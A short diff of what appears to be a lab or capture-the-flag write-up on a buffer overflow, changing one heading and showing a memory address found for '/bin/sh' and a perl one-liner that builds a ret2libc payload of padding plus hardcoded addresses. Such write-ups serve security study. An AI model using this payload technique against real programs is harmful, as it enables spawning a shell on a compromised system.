@@ -194,7 +194,7 @@ warning: Unable to access target memory at 0xb7fd3160, halting search.
 0xb7f8cc58:	 "/bin/sh"
 ```
 
-#### Prepare ret2libc attack
+#### Prepare attack
 
 ```
 perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"'
